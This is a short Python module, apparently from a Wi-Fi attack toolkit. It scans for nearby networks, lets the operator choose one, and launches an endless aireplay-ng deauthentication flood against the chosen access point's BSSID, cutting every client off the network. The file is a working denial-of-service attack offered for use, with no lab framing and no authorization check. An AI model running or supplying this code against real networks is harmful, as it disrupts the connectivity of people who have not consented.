import os
from scanner.wifi_scanner import scan_networks, choose_target

def deauth_attack(adapter):

    print("[*] Scanning for target networks...\n")
    networks = scan_networks(adapter)

    if not networks:
        print("[-] No networks found.")
        return

    target = choose_target(networks)
    bssid = target[1]
    channel = target[2]
    essid = target[3]

    print(f"\n[+] Launching deauth attack on: {essid} (BSSID: {bssid}, CH: {channel})")
    
    os.system(f"sudo iw dev {adapter} set channel {channel}")
    os.system(f"sudo aireplay-ng --deauth 0 -a {bssid} {adapter}")
